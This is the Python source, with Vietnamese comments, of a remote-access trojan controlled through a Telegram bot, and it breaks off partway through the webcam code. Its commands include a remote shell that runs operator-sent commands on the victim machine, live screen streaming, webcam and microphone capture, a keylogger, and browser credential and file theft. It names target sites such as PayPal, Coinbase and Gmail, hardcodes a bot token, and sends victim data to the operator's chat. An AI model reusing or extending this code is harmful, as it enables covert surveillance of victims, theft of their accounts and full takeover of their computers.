import os
import re
import asyncio
import sys
import json
import tempfile
import time 
import platform
import getpass
import random
import shutil
import signal
import uuid
import threading
from datetime import datetime
from base64 import b64decode
from io import BytesIO
from json import loads
from sqlite3 import connect as sql_connect
from ctypes import Structure, POINTER, wintypes, windll, byref, cdll, c_char, c_buffer

# Thư viện bên thứ ba
import cv2
import numpy as np
import pyautogui
from pynput import keyboard
from Crypto.Cipher import AES
import sounddevice as sd
import wavio
import zipfile
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, BotCommandScopeDefault
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Các lệnh bot
COMMANDS = {
    "/menu": "Hiển thị danh sách các lệnh.",
    "/shell": "Mở reverse shell để thực thi lệnh.",
    "/stream": "Xem trực tiếp màn hình.",
    "/webcam": "Điều khiển webcam (chụp ảnh/quay video).",
    "/keylogger": "Ghi lại các phím được nhấn.",
    "/stealcreds": "Thu thập thông tin đăng nhập từ trình duyệt",
    "/stealfiles": "Thu thập các file theo định dạng",
    "/systeminfo": "Lấy thông tin hệ thống",
    "/record": "Ghi âm từ microphone",
}

# Đường dẫn và biến môi trường
AUTHORIZED_USER_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_data.json')
LOCAL_APPDATA = os.getenv('LOCALAPPDATA')
TEMP_DIR = os.getenv("TEMP")
PC_NAME = platform.node()

# Biến kiểm soát các hoạt động
is_streaming = False
is_recording = False
is_logging = False
is_recording_audio = False
is_shell_active = False

# Biến lưu trữ task
stream_task = None
webcam_task = None
log_thread = None
audio_task = None
key_logs = []
log_interval = 60  # 60 giây = 1 phút

# Biến lưu thông tin thu thập
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, B00KM4rK5 = [], [], [], [], [], [], [], []

# Danh sách từ khóa để tìm trang web
k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', 
           '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', 
           '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', 
           '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', 
           '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', 
           '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', 
           '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', 
           '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', 
           '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', 
           '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', 
           '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 
           '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', 
           '[stake](https://stake.com)']

# Lớp DATA_BLOB cho việc giải mã
class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

# Thêm hàm xử lý phím được nhấn (đặt ở đầu file, sau các imports)
def on_press(key):
    global key_logs
    try:
        if not key_logs:
            key_logs.append("")
            
        # Xử lý phím thông thường    
        if hasattr(key, 'char'):
            if key.char and key.char.isprintable():
                # Chỉ thêm ký tự nếu không phải là ký tự điều khiển
                if ord(key.char) >= 32:
                    # Xử lý ký tự tiếng Việt
                    key_logs[-1] += key.char
                    
        # Xử lý phím đặc biệt        
        else:
            # Map các phím đặc biệt
            special_keys = {
                'space': ' ',
                'enter': '\n',
                'backspace': '',
                'tab': '\t',
                'delete': '',
            }
            
            key_name = getattr(key, 'name', str(key))
            
            if key_name == 'enter':
                if key_logs[-1] != "":  # Chỉ tạo dòng mới nếu dòng hiện tại không trống
                    key_logs.append("")
            elif key_name == 'backspace' and key_logs[-1]:
                key_logs[-1] = key_logs[-1][:-1]
            elif key_name in special_keys:
                key_logs[-1] += special_keys[key_name]
                
    except Exception as e:
        print(f"Lỗi khi ghi log phím: {e}")

# Thêm hàm bắt đầu keylogger
def start_keylogger():
    global is_logging
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while is_logging:
        time.sleep(1)
    listener.stop()

# Decorator để kiểm tra quyền truy cập
def require_auth(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if os.path.exists(AUTHORIZED_USER_FILE):
                with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    # Thay đổi cách đọc user_id
                    authorized_id = data.get('user_id')  # Đọc trực tiếp từ root
                    if update.effective_user.id != authorized_id:
                        if update.callback_query is not None:
                            await update.callback_query.answer(
                                "⚠️ Bạn không có quyền sử dụng bot này!",
                                show_alert=True
                            )
                        elif update.message is not None:
                            await update.message.reply_text(
                                "⚠️ Bạn không có quyền sử dụng bot này!"
                            )
                        return
            else:
                # Tạo file xác thực mới nếu chưa tồn tại
                data = {
                    'user_id': update.effective_user.id,  # Lưu trực tiếp vào root
                    'chat_id': update.effective_chat.id,
                    'username': update.effective_user.username,
                    'registered_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                    json.dump(data, f, ensure_ascii=False, indent=4)
                    
            return await func(update, context)
        except Exception as e:
            print(f"Lỗi khi kiểm tra quyền truy cập: {e}")
            try:
                if update.callback_query is not None:
                    await update.callback_query.answer(
                        "❌ Có lỗi xảy ra!",
                        show_alert=True
                    )
                elif update.message is not None:
                    await update.message.reply_text(
                        "❌ Có lỗi xảy ra!"
                    )
            except:
                pass
    return wrapper

async def save_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Khởi tạo người dùng đầu tiên hoặc kiểm tra quyền truy cập"""
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username
        chat_id = update.effective_chat.id

        if not os.path.exists(AUTHORIZED_USER_FILE):
            user_data = {
                'user_id': user_id,  # Lưu trực tiếp vào root
                'chat_id': chat_id,
                'username': username,
                'registered_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, ensure_ascii=False, indent=4)
            
            await update.message.reply_text(
                "🎉 Chào mừng! Bạn đã được đăng ký là chủ sở hữu duy nhất của bot.\n"
                "Sử dụng /menu để xem danh sách lệnh."
            )
            await notify_startup(context.bot, chat_id)
        else:
            with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if user_id == data.get('user_id'):  # Đọc trực tiếp từ root
                    if chat_id != data.get('chat_id'):
                        data['chat_id'] = chat_id
                        with open(AUTHORIZED_USER_FILE, 'w', encoding='utf-8') as f:
                            json.dump(data, f, ensure_ascii=False, indent=4)
                    await update.message.reply_text(
                        "✅ Xác thực thành công!\n"
                        "Sử dụng /menu để xem danh sách lệnh."
                    )
                else:
                    await update.message.reply_text(
                        "⛔️ Truy cập bị từ chối!\n"
                        "Bot này đã có chủ sở hữu, bạn không thể sử dụng."
                    )
    except Exception as e:
        print(f"Lỗi khi xử lý đăng ký người dùng: {str(e)}")

@require_auth
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_list = "\n".join([
        f"🔻 {command} ➡️ {desc}" for command, desc in COMMANDS.items()
    ])
    menu_text = f"DANH SÁCH CÁC LỆNH\n\n{commands_list}"
    await update.message.reply_text(menu_text)

async def set_command_suggestions(application):
    """Thiết lập menu commands cho bot"""
    commands = [
        BotCommand("/menu", "Hiển thị danh sách các lệnh"),
        BotCommand("/shell", "Mở reverse shell để thực thi lệnh"),
        BotCommand("/stream", "Xem trực tiếp màn hình"),
        BotCommand("/webcam", "Điều khiển webcam (chụp ảnh/quay video)"),
        BotCommand("/keylogger", "Ghi lại các phím được nhấn"),
        BotCommand("/stealcreds", "Thu thập thông tin đăng nhập từ trình duyệt"),
        BotCommand("/stealfiles", "Thu thập các file theo định dạng"),
        BotCommand("/systeminfo", "Lấy thông tin hệ thống"),
        BotCommand("/record", "Ghi âm từ microphone"),
    ]
    await application.bot.set_my_commands(
        commands=commands,
        scope=BotCommandScopeDefault()
    )

@require_auth
@require_auth
async def start_stream(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("▶️ Bắt đầu Stream", callback_data="start_stream")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Stream màn hình:\n"
        "Nhấn nút để bắt đầu xem.",
        reply_markup=reply_markup
    )

@require_auth
async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Khởi tạo reverse shell"""
    # Khởi tạo lịch sử lệnh nếu chưa có
    if 'shell_history' not in context.user_data:
        context.user_data['shell_history'] = []
    if 'shell_safe_mode' not in context.user_data:
        context.user_data['shell_safe_mode'] = True

    keyboard = [
        [
            InlineKeyboardButton("🖥️ Bắt đầu Shell", callback_data="start_shell"),
            InlineKeyboardButton("❌ Dừng Shell", callback_data="stop_shell")
        ],
        [
            InlineKeyboardButton("📜 Lịch sử", callback_data="shell_history"),
            InlineKeyboardButton("💡 Auto-complete", callback_data="shell_autocomplete")
        ],
        [
            InlineKeyboardButton("🔒 Chế độ an toàn ON" if context.user_data['shell_safe_mode'] else "🔓 Chế độ an toàn OFF",
            callback_data="shell_safe_mode")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    help_text = (
        "🖥️ Command Shell Nâng Cao:\n\n"
        "• Lịch sử: Xem và sử dụng lại lệnh đã chạy\n"
        "• Auto-complete: Gợi ý lệnh khi gõ\n"
        "• Chế độ an toàn: Chặn các lệnh nguy hiểm\n"
        "• Hỗ trợ đường dẫn tương đối\n"
        "• Hiển thị exit code của lệnh"
    )
    
    await update.message.reply_text(help_text, reply_markup=reply_markup)

@require_auth
async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý shell"""
    global is_shell_active
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_shell":
            if is_shell_active:
                await query.answer("Shell đang chạy!", show_alert=True)
                return
                
            is_shell_active = True
            message = await query.message.reply_text("🔄 Đang khởi động shell...\n\nGõ lệnh để thực thi:")
            
            # Lưu message_id để theo dõi nhập lệnh
            context.user_data['shell_message'] = message.message_id
            context.user_data['waiting_for'] = 'shell_command'
            
        elif query.data == "stop_shell":
            is_shell_active = False
            context.user_data['waiting_for'] = None
            await query.edit_message_text("❌ Đã đóng shell")
            
    except Exception as e:
        await query.message.reply_text(f"❌ Lỗi: {str(e)}")

@require_auth
async def handle_stream_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_streaming, stream_task
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id

    try:
        if query.data == "start_stream":
            if is_streaming:
                await query.answer("Stream đang chạy!", show_alert=True)
                return

            async def stream_screen():
                global is_streaming
                try:
                    # Khởi tạo giá trị mặc định nếu chưa có
                    if 'quality' not in context.user_data:
                        context.user_data['quality'] = 60
                    if 'fps' not in context.user_data:
                        context.user_data['fps'] = 1
                    if 'scale' not in context.user_data:
                        context.user_data['scale'] = 50

                    # Gửi thông báo bắt đầu stream với các tùy chọn hiện tại
                    keyboard = [
                        [
                            InlineKeyboardButton("⬆️ Chất lượng", callback_data="quality_up"),
                            InlineKeyboardButton("⬇️ Chất lượng", callback_data="quality_down")
                        ],
                        [
                            InlineKeyboardButton("⬆️ FPS", callback_data="fps_up"),
                            InlineKeyboardButton("⬇️ FPS", callback_data="fps_down")
                        ],
                        [InlineKeyboardButton("⏹ Dừng Stream", callback_data="stop_stream")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=f"✅ Đang bắt đầu stream...\nChất lượng: {context.user_data['quality']}%\nFPS: {context.user_data['fps']}",
                        reply_markup=reply_markup
                    )
                    
                    while is_streaming:
                        try:
                            # Chụp màn hình
                            screenshot = pyautogui.screenshot()
                            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
                            
                            # Resize theo tỉ lệ
                            width = int(frame.shape[1] * context.user_data['scale'] / 100)
                            height = int(frame.shape[0] * context.user_data['scale'] / 100)
                            frame = cv2.resize(frame, (width, height))
                            
                            # Nén ảnh với chất lượng tùy chỉnh
                            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, context.user_data['quality']])
                            bio = BytesIO(buffer)
                            bio.seek(0)

                            # Tạo keyboard với các nút điều khiển
                            keyboard = [
                                [
                                    InlineKeyboardButton("⬆️ Chất lượng", callback_data="quality_up"),
                                    InlineKeyboardButton("⬇️ Chất lượng", callback_data="quality_down")
                                ],
                                [
                                    InlineKeyboardButton("⬆️ FPS", callback_data="fps_up"),
                                    InlineKeyboardButton("⬇️ FPS", callback_data="fps_down")
                                ],
                                [InlineKeyboardButton("⏹ Dừng Stream", callback_data="stop_stream")]
                            ]
                            reply_markup = InlineKeyboardMarkup(keyboard)
                            
                            # Gửi frame với thông tin stream hiện tại
                            await context.bot.send_photo(
                                chat_id=chat_id,
                                photo=bio,
                                caption=f"🎥 Live stream | Chất lượng: {context.user_data['quality']}% | FPS: {context.user_data['fps']}",
                                reply_markup=reply_markup
                            )
                            
                            # Điều chỉnh delay theo FPS hiện tại
                            await asyncio.sleep(1/context.user_data['fps'])
                            
                        except Exception as frame_error:
                            print(f"Lỗi khi xử lý frame: {frame_error}")
                            await asyncio.sleep(1)  # Tránh spam lỗi
                except Exception as e:
                    print(f"Lỗi trong stream_screen: {e}")
                finally:
                    is_streaming = False
                    # Gửi thông báo mới thay vì edit
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text="❌ Stream đã dừng"
                        )
                    except:
                        pass

            is_streaming = True
            stream_task = asyncio.create_task(stream_screen())
            # Xóa message gốc thay vì edit
            try:
                await query.message.delete()
            except:
                pass
            
        elif query.data == "quality_up":
            # Tăng chất lượng JPEG thêm 10%
            if 'quality' not in context.user_data:
                context.user_data['quality'] = 60
            context.user_data['quality'] = min(100, context.user_data['quality'] + 10)
            await query.answer(f"Đã tăng chất lượng lên {context.user_data['quality']}%")
            
        elif query.data == "quality_down":
            # Giảm chất lượng JPEG đi 10%
            if 'quality' not in context.user_data:
                context.user_data['quality'] = 60
            context.user_data['quality'] = max(10, context.user_data['quality'] - 10)
            await query.answer(f"Đã giảm chất lượng xuống {context.user_data['quality']}%")
            
        elif query.data == "fps_up":
            # Tăng FPS thêm 1
            if 'fps' not in context.user_data:
                context.user_data['fps'] = 1
            context.user_data['fps'] = min(10, context.user_data['fps'] + 1)
            await query.answer(f"Đã tăng FPS lên {context.user_data['fps']}")
            
        elif query.data == "fps_down":
            # Giảm FPS đi 1
            if 'fps' not in context.user_data:
                context.user_data['fps'] = 1
            context.user_data['fps'] = max(1, context.user_data['fps'] - 1)
            await query.answer(f"Đã giảm FPS xuống {context.user_data['fps']}")
            
        elif query.data == "stop_stream":
            if not is_streaming:
                await query.answer("Stream đã dừng!", show_alert=True)
                return
            
            is_streaming = False
            if stream_task:
                stream_task.cancel()
                stream_task = None
            # Chỉ edit message hiện tại (message có nút stop)
            try:
                await query.edit_message_caption(
                    caption="✅ Đã dừng stream tại ảnh này",
                    reply_markup=None
                )
            except:
                pass
            
    except Exception as e:
        print(f"Lỗi trong stream control: {e}")
        await query.answer("❌ Có lỗi xảy ra", show_alert=True)

async def notify_startup(bot, chat_id=None):
    """Gửi thông báo khi bot khởi động"""
    # Bỏ qua gửi thông báo nếu chưa có file cấu hình
    if not os.path.exists(AUTHORIZED_USER_FILE):
        print("⚠️ Chưa có file cấu hình bot_data.json")
        return
        
    try:
        # Nếu không có chat_id, đọc từ file
        if chat_id is None:
            try:
                with open(AUTHORIZED_USER_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    chat_id = data.get('chat_id')
                    if not chat_id:
                        print("⚠️ Không tìm thấy chat_id trong file cấu hình")
                        return
            except Exception as e:
                print(f"❌ Lỗi khi đọc file cấu hình: {str(e)}")
                return

        # Chỉ gửi thông báo nếu có chat_id hợp lệ
        startup_message = "🤖 Bot đã online và sẵn sàng!\n\n"
        print(f"🔄 Đang gửi thông báo khởi động tới chat_id: {chat_id}")
        
        try:
            await bot.send_message(
                chat_id=chat_id,
                text=startup_message
            )
            print(f"✅ Đã gửi thông báo khởi động thành công")
        except Exception as e:
            if "Chat not found" in str(e):
                print(f"❌ Chat_id {chat_id} không tồn tại hoặc bot chưa được khởi động lần đầu")
            else:
                print(f"❌ Lỗi khi gửi thông báo: {str(e)}")
    except Exception as e:
        print(f"❌ Lỗi không xác định: {str(e)}")

def is_bot_already_running():
    """Kiểm tra xem bot đã đang chạy hay chưa bằng cơ chế file lock"""
    bot_lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
    
    try:
        # Nếu file lock tồn tại, kiểm tra PID
        if os.path.exists(bot_lock_file):
            # Đọc thông tin từ file lock
            with open(bot_lock_file, 'r') as f:
                content = f.read().strip()
                
            # Phân tích thông tin PID và timestamp
            if ',' in content:
                parts = content.split(',')
                old_pid = int(parts[0])
                timestamp = parts[1]
                
                # Kiểm tra xem file lock có cũ hơn 30 phút không
                try:
                    lock_time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                    if (datetime.now() - lock_time).total_seconds() > 1800:  # 30 phút
                        # File lock quá cũ, xóa và tạo mới
                        os.remove(bot_lock_file)
                        create_lock_file(bot_lock_file)
                        return False
                except ValueError:
                    # Timestamp không hợp lệ, xóa và tạo mới
                    os.remove(bot_lock_file)
                    create_lock_file(bot_lock_file)
                    return False
            else:
                # Format không hợp lệ, cố gắng phân tích thành PID
                try:
                    old_pid = int(content)
                except ValueError:
                    # Không phải số, xóa và tạo mới
                    os.remove(bot_lock_file)
                    create_lock_file(bot_lock_file)
                    return False
            
            # Kiểm tra xem tiến trình có tồn tại không
            if is_process_running(old_pid):
                return True
            
            # Tiến trình không tồn tại, xóa và tạo mới file lock
            os.remove(bot_lock_file)
        
        # Tạo file lock mới
        create_lock_file(bot_lock_file)
        return False
        
    except Exception as e:
        print(f"Lỗi khi kiểm tra instance: {e}")
        # Trong trường hợp lỗi, thử xóa file lock nếu tồn tại
        try:
            if os.path.exists(bot_lock_file):
                os.remove(bot_lock_file)
            create_lock_file(bot_lock_file)
        except:
            pass
        return False

def create_lock_file(lock_file_path):
    """Tạo file lock với PID hiện tại và timestamp"""
    with open(lock_file_path, 'w') as f:
        f.write(f"{os.getpid()},{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def is_process_running(pid):
    """Kiểm tra xem tiến trình có đang chạy không dựa trên PID"""
    if platform.system() == "Windows":
        # Cách kiểm tra cho Windows
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            process = kernel32.OpenProcess(1, 0, pid)
            if process:
                kernel32.CloseHandle(process)
                return True
            return False
        except:
            return False
    else:
        # Cách kiểm tra cho Unix/Linux
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

async def main():
    """Hàm chính của ứng dụng bot Telegram"""
    try:
   
        # Kiểm tra nếu bot đã đang chạy
        if is_bot_already_running():
            print("⚠️ Bot đã đang chạy! Không thể chạy thêm instance mới.")
            sys.exit(1)
        
        # Token bot Telegram
        TOKEN = '7850235518:AAGbSEqxiBsJHTCf-UPY2wGBB6Erig-WX_U'
    
        # Khởi tạo ứng dụng
        application = setup_telegram_application(TOKEN)
        
        # Khởi động bot và bắt đầu polling
        await start_telegram_bot(application)
        
        # Thiết lập xử lý tín hiệu hệ thống
        setup_signal_handlers(application)
        
        # Vòng lặp chính - giữ cho bot chạy
        print("✅ Bot đã khởi động thành công!")
        await keep_bot_running(application)
            
    except KeyboardInterrupt:
        print("\n⚠️ Nhận tín hiệu KeyboardInterrupt")
        if 'application' in locals():
            await graceful_shutdown(application)
    except SystemExit:
        # Đã xử lý ở trên
        pass
    except Exception as e:
        print(f"❌ Lỗi khởi động bot: {e}")
        if 'application' in locals():
            await graceful_shutdown(application)
    finally:
        # Đảm bảo tất cả đều được dọn dẹp
        if 'application' in locals():
            await graceful_shutdown(application)
            
def setup_telegram_application(token):
    """Thiết lập ứng dụng Telegram với handlers"""
    application = ApplicationBuilder().token(token).build()
    
    # Danh sách command handlers
    command_handlers = [
        ("start", save_chat_id),
        ("menu", menu),
        ("shell", shell_command),
        ("stream", start_stream),
        ("webcam", webcam_control),
        ("keylogger", keylogger_control),
        ("stealcreds", steal_creds),
        ("stealfiles", steal_files),
        ("systeminfo", system_info),
        ("record", record_control),
    ]
    
    # Danh sách callback query handlers
    callback_handlers = [
        (handle_stream_control, "^(start_stream|stop_stream)$"),
        (handle_webcam, "^(webcam_photo|webcam_video|stop_recording)$"),
        (handle_keylogger, "^(start_logging|stop_logging)$"),
        (handle_audio_recording, "^(start_recording_audio|stop_recording_audio)$"),
        (handle_shell, "^(start_shell|stop_shell)$"),
    ]
    
    # Đăng ký message handler cho shell command
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        handle_text_message
    ))
    
    # Đăng ký command handlers
    for command, handler in command_handlers:
        application.add_handler(CommandHandler(command, handler))
    
    # Đăng ký callback query handlers
    for handler, pattern in callback_handlers:
        application.add_handler(CallbackQueryHandler(handler, pattern=pattern))
    

    return application

async def start_telegram_bot(application):
    """Khởi động bot và bắt đầu polling"""
    # Thiết lập command suggestions
    await set_command_suggestions(application)
    
    # Thông báo khởi động
    await notify_startup(application.bot)
    
    # Khởi động application
    await application.initialize()
    await application.start()
    
    # Bắt đầu polling với tùy chọn ổn định
    await application.updater.start_polling(
        poll_interval=1.0,
        timeout=30,
        bootstrap_retries=5,
        drop_pending_updates=True,
        allowed_updates=None
    )

def setup_signal_handlers(application):
    """Thiết lập xử lý tín hiệu hệ thống"""
    def signal_handler():
        asyncio.create_task(graceful_shutdown(application))
    
    try:
        loop = asyncio.get_event_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, signal_handler)
            except NotImplementedError:
                # Windows không hỗ trợ add_signal_handler
                pass
    except Exception as e:
        print(f"⚠️ Không thể thiết lập xử lý tín hiệu: {e}")

async def keep_bot_running(application):
    """Giữ cho bot chạy với xử lý lỗi"""
    running = True
    while running:
        try:
            await asyncio.sleep(1)
        except asyncio.CancelledError:
            running = False
            print("⚠️ Nhận tín hiệu hủy bỏ...")
            await graceful_shutdown(application)
        except KeyboardInterrupt:
            running = False
            print("⚠️ Nhận tín hiệu KeyboardInterrupt...")
            await graceful_shutdown(application)

# Thêm hàm shell command
@require_auth
async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Khởi tạo shell"""
    keyboard = [
        [InlineKeyboardButton("🖥️ Bắt đầu Shell", callback_data="start_shell")],
        [InlineKeyboardButton("❌ Dừng Shell", callback_data="stop_shell")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🖥️ Command Shell:\n"
        "• Bắt đầu: Mở shell để thực thi lệnh\n"
        "• Dừng: Đóng shell và ngắt kết nối",
        reply_markup=reply_markup
    )

@require_auth
async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý shell"""
    global is_shell_active
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_shell":
            if is_shell_active:
                await query.answer("Shell đang chạy!", show_alert=True)
                return
                
            is_shell_active = True
            message = await query.message.reply_text(
                "🔄 Đang khởi động shell...\n\nGõ lệnh để thực thi:"
            )
            
            # Lưu message_id để theo dõi nhập lệnh
            context.user_data['shell_message'] = message.message_id
            context.user_data['waiting_for'] = 'shell_command'
            
        elif query.data == "stop_shell":
            is_shell_active = False
            context.user_data['waiting_for'] = None
            await query.edit_message_text("❌ Đã đóng shell")
            
    except Exception as e:
        await query.message.reply_text(f"❌ Lỗi: {str(e)}")

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý tin nhắn văn bản"""
    if not context.user_data.get('waiting_for'):
        return

    try:
        message_text = update.message.text
        
        if context.user_data['waiting_for'] == 'shell_command':
            if not is_shell_active:
                await update.message.reply_text("❌ Shell đã đóng!")
                context.user_data['waiting_for'] = None
                return
                
            try:
                # Thực thi lệnh shell
                process = await asyncio.create_subprocess_shell(
                    message_text,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                # Gửi kết quả
                if stdout:
                    out = stdout.decode()
                    await update.message.reply_text(f"📤 Output:\n{out}")
                if stderr:
                    err = stderr.decode()
                    await update.message.reply_text(f"❌ Error:\n{err}")
                    
            except Exception as e:
                await update.message.reply_text(f"❌ Lỗi thực thi: {str(e)}")
            return
            
        # Xóa trạng thái chờ cho các trường hợp khác
        context.user_data['waiting_for'] = None
        
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

# Thêm hàm điều khiển webcam
@require_auth
async def webcam_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Khởi tạo các giá trị mặc định cho webcam
    if 'webcam_res' not in context.user_data:
        context.user_data['webcam_res'] = '720p'  # 720p, 1080p
    if 'webcam_effect' not in context.user_data:
        context.user_data['webcam_effect'] = 'none'  # none, gray, blur, edge
    if 'webcam_duration' not in context.user_data:
        context.user_data['webcam_duration'] = 30  # Thời gian quay video (giây)
    if 'webcam_id' not in context.user_data:
        context.user_data['webcam_id'] = 0  # ID của webcam đang sử dụng

    keyboard = [
        [
            InlineKeyboardButton("📸 Chụp ảnh", callback_data="webcam_photo"),
            InlineKeyboardButton("🎥 Quay video", callback_data="webcam_video")
        ],
        [
            InlineKeyboardButton("⏱ Time-lapse", callback_data="webcam_timelapse"),
            InlineKeyboardButton("🔄 Đổi camera", callback_data="webcam_switch")
        ],
        [
            InlineKeyboardButton("🎨 Hiệu ứng", callback_data="webcam_effect"),
            InlineKeyboardButton("⚙️ Độ phân giải", callback_data="webcam_res")
        ],
        [
            InlineKeyboardButton("⬆️ Thời gian +30s", callback_data="duration_up"),
            InlineKeyboardButton("⬇️ Thời gian -30s", callback_data="duration_down")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    current_res = context.user_data['webcam_res']
    current_effect = context.user_data['webcam_effect']
    current_duration = context.user_data['webcam_duration']
    current_cam = context.user_data['webcam_id']

    await update.message.reply_text(
        f"Điều khiển Webcam:\n\n"
        f"📹 Camera: {current_cam}\n"
        f"🖥 Độ phân giải: {current_res}\n"
        f"🎨 Hiệu ứng: {current_effect}\n"
        f"⏱ Thời gian quay: {current_duration}s\n\n"
        f"• Chụp ảnh: Chụp và gửi một ảnh\n"
        f"• Quay video: Quay video với thời gian tùy chỉnh\n"
        f"• Time-lapse: Chụp ảnh theo khoảng thời gian\n"
        f"• Hiệu ứng: none, gray, blur, edge",
        reply_markup=reply_markup
    )

# Thêm hàm xử lý các nút điều khiển webcam
# Hàm áp dụng hiệu ứng cho frame
def apply_effect(frame, effect):
    if effect == 'gray':
        return cv2.cvtColor(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), cv2.COLOR_GRAY2BGR)
    elif effect == 'blur':
        return cv2.GaussianBlur(frame, (15, 15), 0)
    elif effect == 'edge':
        edges = cv2.Canny(frame, 100, 200)
        return cv2.cvtColor(edges, cv2.COLOR_GRAY2BGR)
    return frame

async def handle_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_recording, webcam_task
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    
    try:
        # Xử lý các tùy chọn webcam
        if query.data == "webcam_switch":
            # Chuyển đổi giữa các webcam
            available_cams = [i for i in range(5) if cv2.VideoCapture(i).isOpened()]
            if not available_cams:
                await query.answer("❌ Không tìm thấy webcam nào!", show_alert=True)
                return
            current_cam = context.user_data['webcam_id']
            next_cam = (current_cam + 1) % len(available_cams)
            context.user_data['webcam_id'] = next_cam
            await query.answer(f"🔄 Đã chuyển sang camera {next_cam}")
            
        elif query.data == "webcam_effect":
            # Đổi hiệu ứng
            effects = ['none', 'gray', 'blur', 'edge']
            current_effect = context.user_data['webcam_effect']
            next_effect = effects[(effects.index(current_effect) + 1) % len(effects)]
            context.user_data['webcam_effect'] = next_effect
            await query.answer(f"🎨 Đã đổi hiệu ứng: {next_effect}")
            
        elif query.data == "webcam_res":
            # Đổi độ phân giải
            resolutions = ['480p', '720p', '1080p']
            current_res = context.user_data['webcam_res']
            next_res = resolutions[(resolutions.index(current_res) + 1) % len(resolutions)]
            context.user_data['webcam_res'] = next_res
            await query.answer(f"⚙️ Đã đổi độ phân giải: {next_res}")
            
        elif query.data == "duration_up":
            # Tăng thời gian quay
            context.user_data['webcam_duration'] = min(300, context.user_data['webcam_duration'] + 30)
            await query.answer(f"⏱ Thời gian quay: {context.user_data['webcam_duration']}s")
            
        elif query.data == "webcam_photo":
            # Chụp ảnh với các tùy chọn hiện tại
            cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
            if not cap.isOpened():
                await query.edit_message_text("❌ Không thể kết nối webcam!")
                return

            # Thiết lập độ phân giải
            res_map = {
                '480p': (640, 480),
                '720p': (1280, 720),
                '1080p': (1920, 1080)
            }
